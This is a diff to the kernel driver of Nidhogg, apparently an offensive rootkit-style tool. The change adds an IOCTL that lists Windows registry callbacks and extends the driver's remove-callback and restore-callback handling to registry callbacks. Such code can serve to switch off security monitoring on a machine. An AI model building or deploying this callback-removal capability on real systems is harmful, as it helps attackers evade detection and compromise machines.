@@ -34,8 +34,9 @@
 
 #define IOCTL_NIDHOGG_LIST_OBCALLBACKS CTL_CODE(0x8000, 0x81A, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_LIST_PSROUTINES CTL_CODE(0x8000, 0x81B, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_REMOVE_CALLBACK CTL_CODE(0x8000, 0x81C, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_RESTORE_CALLBACK CTL_CODE(0x8000, 0x81D, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_LIST_REGCALLBACKS CTL_CODE(0x8000, 0x81C, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_REMOVE_CALLBACK CTL_CODE(0x8000, 0x81D, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_RESTORE_CALLBACK CTL_CODE(0x8000, 0x81E, METHOD_BUFFERED, FILE_ANY_ACCESS)
 // *******************************************************************************************************
 
 /*
@@ -1178,6 +1179,21 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		len += sizeof(PsRoutinesList);
 		break;
 	}
+	case IOCTL_NIDHOGG_LIST_REGCALLBACKS:
+	{
+		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
+
+		if (size % sizeof(CmCallbacksList) != 0) {
+			status = STATUS_INVALID_BUFFER_SIZE;
+			break;
+		}
+
+		auto data = (CmCallbacksList*)Irp->AssociatedIrp.SystemBuffer;
+		status = ListRegistryCallbacks(data, NULL, NULL);
+
+		len += sizeof(CmCallbacksList);
+		break;
+	}
 
 	case IOCTL_NIDHOGG_REMOVE_CALLBACK:
 	{
@@ -1202,7 +1218,8 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		case PsCreateThreadType:
 		case PsCreateThreadTypeNonSystemThread:
 		case ObProcessType:
-		case ObThreadType: {
+		case ObThreadType:
+		case CmRegistryType: {
 			status = RemoveCallback(data);
 			break;
 		}
@@ -1240,7 +1257,8 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		case PsCreateThreadType:
 		case PsCreateThreadTypeNonSystemThread:
 		case ObProcessType:
-		case ObThreadType: {
+		case ObThreadType: 
+		case CmRegistryType: {
 			status = RestoreCallback(data);
 			break;
 		}
